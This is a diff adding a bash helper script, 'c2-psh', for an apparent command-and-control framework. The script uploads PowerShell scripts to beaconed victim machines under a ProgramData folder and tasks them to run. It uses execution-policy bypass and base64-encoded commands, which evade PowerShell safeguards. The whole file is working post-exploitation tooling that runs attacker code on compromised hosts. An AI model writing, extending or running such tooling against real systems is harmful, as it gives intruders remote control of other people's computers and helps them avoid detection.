@@ -1,0 +1,40 @@
+#!/bin/bash
+# c2-psh - Execute PowerShell command/script on target
+# Usage: c2-psh [-script <path>] [-cmd <command>] [beacon_id]
+C2="$(dirname "$0")/c2"
+BEACON=""
+SCRIPT=""
+CMD=""
+
+while [ $# -gt 0 ]; do
+    case "$1" in
+        -s|-script) SCRIPT="$2"; shift 2 ;;
+        -c|-cmd)    CMD="$2"; shift 2 ;;
+        -b|-beacon) BEACON="$2"; shift 2 ;;
+        *)          BEACON="$1"; shift ;;
+    esac
+done
+
+if [ -n "$BEACON" ]; then
+    $C2 use "$BEACON" >/dev/null 2>&1
+fi
+
+if [ -n "$SCRIPT" ]; then
+    # Upload script and execute
+    echo "[*] Uploading script: $SCRIPT"
+    $C2 upload "$SCRIPT" "C:\\programdata\\puppet\\$(basename "$SCRIPT")"
+    sleep 5
+    echo "[*] Tasking PowerShell execution..."
+    $C2 task "powershell -NoP -Ep Bypass -File C:\\programdata\\puppet\\$(basename "$SCRIPT")"
+elif [ -n "$CMD" ]; then
+    # Direct PowerShell command
+    echo "[*] Tasking PowerShell command..."
+    ENC=$(echo -n "$CMD" | iconv -t UTF-16LE | base64 | tr -d '\n')
+    $C2 task "powershell -NoP -Ep Bypass -Enc $ENC"
+else
+    echo "Usage: c2-psh -script <file.ps1>|-cmd '<command>' [beacon_id]"
+    exit 1
+fi
+
+echo "[*] Waiting 90s for execution..."
+$C2 wait 90
